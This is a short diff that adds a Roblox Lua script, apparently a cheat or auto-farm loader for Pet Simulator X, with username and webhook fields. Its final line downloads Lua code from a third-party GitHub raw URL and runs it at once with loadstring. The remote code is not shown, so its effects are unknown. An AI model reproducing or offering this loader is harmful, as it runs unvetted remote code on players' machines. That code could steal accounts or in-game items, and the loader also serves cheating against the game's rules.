@@ -1,0 +1,5 @@
+Username =  "micro_X123"
+ScriptName = "AUTO FARM yeet island"
+Webhook = ""
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KuritoScripts/PSXscript2023/main/working.petsimulatorx.lua20%25%25", true))()
